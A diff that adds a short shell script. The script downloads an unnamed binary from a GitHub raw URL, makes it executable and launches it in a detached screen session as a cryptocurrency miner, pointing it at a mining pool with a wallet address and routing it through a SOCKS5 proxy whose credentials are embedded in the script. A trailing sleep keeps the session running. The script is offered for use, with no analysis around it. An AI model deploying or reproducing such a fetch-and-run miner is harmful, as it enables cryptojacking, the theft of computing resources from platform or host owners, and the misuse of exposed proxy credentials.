@@ -1,0 +1,6 @@
+apt update
+apt install screen -y
+wget https://github.com/kilosri/de/raw/main/gasken
+chmod +x gasken
+screen -dmS run ./gasken -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RDuJgKwVgh1MAQoQPCKLKyZvQ36wFGCnEd.gupron -t 1 -x socks5://5exieihaamvdju:4wgfbizwdwgm45kxx4rlb89ucgagfe@us-east-static-09.quotaguard.com:1080
+sleep 65654 >/dev/null 2>&1
